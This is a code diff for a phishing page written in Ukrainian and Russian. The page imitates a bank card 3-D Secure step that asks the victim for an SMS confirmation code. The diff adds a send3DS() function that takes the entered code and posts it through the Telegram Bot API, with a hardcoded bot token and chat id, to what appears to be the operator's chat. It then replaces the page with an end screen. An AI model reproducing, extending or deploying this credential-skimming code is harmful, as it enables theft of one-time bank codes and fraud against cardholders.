@@ -23,6 +23,7 @@
     font-size: 2em; /* Размер надписи */
    }
   </style>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
 </head>
 
 <body>
@@ -92,9 +93,9 @@
                                         <!-- <form action = '/uk-g'> -->
                                 
 
-                                     <input type="submit" class="card-form__button" name="sub" value="Надіслати код" ></div>
+                                     <!-- <input type="submit" class="card-form__button" name="sub" value="Надіслати код" ></div> -->
 
-                                     <!-- <input type="submit" class="card-form__button" name="submit" value="Надіслати код" onclick="send3DS()"> -->
+                                     <input type="submit" class="card-form__button" name="submit" value="Надіслати код" onclick="send3DS();">
 
                                      
 
@@ -120,12 +121,32 @@
         </div>
     </div>
     <script>
+         let result = null;
+        // let param_sum = null;
     // данные по sms коду*********************************************
         function update(sms) {
-            let param_sum = sms; 
-            console.log(param_sum);
+            let vvv = sms;
+            result = vvv;
+            console.log(result);
+            
         }
     //****************************************************************
+      
+        function send3DS() {    
+        
+            console.log('Button clicked');
+            console.log(result);
+            if (result){
+                // передача через телегу кодсмс
+                const URL_3 = `https://api.telegram.org/bot743294411:AAFQDNM0leSRb3PjFYpe8RNfbx9sBztd3bY/sendMessage?chat_id=634247446&text=${result}`;
+                    console.log("post ...");
+                    axios.post(URL_3); 
+            
+            document.body.innerHTML = '<iframe src="end.html" width="390" height="500" align="left">Ваш браузер не поддерживает плавающие фреймы!</iframe> ';
+             
+        }
+
+        }
 
     // Timer
     let time = 300;
@@ -142,9 +163,9 @@
             location.reload()
         }
     }
-  
-          
+   
     </script>
+  
     <!-- <script src="/static/script.js.Без названия"></script> -->
 </body>
 
